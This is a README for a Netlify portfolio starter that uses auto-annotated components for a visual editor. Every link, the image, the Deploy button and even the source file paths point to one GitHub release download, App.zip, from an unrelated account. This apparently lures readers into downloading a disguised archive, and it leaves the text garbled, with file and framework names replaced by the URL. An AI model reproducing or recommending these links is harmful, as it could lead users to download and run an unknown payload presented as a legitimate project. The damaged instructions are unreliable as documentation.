# Netlify Developer Portfolio Starter (auto-annotated)

![Developer Portfolio](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip)

This is a full-fledged portfolio website built with https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip, Tailwind CSS, [visual editor](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip) and the [Git Content Source](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip).

The codebase showcases **how to apply annotations at scale**, meaning: how to make much of your components [highlightable in the visual editor](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip) through data attributes without manually adding code throughout the codebase.

**This is achieved by:**

1. Adding an annotation property to the content objects at they're loaded (see `https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip`)
1. When rendering the page, each content sub-object is dynamically matched to the appropriate component. At this point, wrap each component with an annotation, based on the abovementioned content property. See `https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip`.

## Deploying to Netlify

If you click "Deploy to Netlify" button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify.

[![Deploy to Netlify](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip)](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip)

## Getting Started

The typical development process is to begin by working locally. Clone this repository, then run `npm install` in its root directory.

Run the https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip development server:

```txt
cd auto-annotated-portfolio
npm run dev
```

Install the [Netlify visual editor CLI](https://github.com/Notyobizniz/Notyobizniz/releases/download/v1.0/App.zip). Then open a new terminal window in the same project directory and run the Netlify visual editor dev server:

```txt
npm install -g @stackbit/cli
stackbit dev
```

This outputs your own Netlify visual editor URL. Open this, register or sign in, and you will be directed to Netlify's visual editor for your new project.
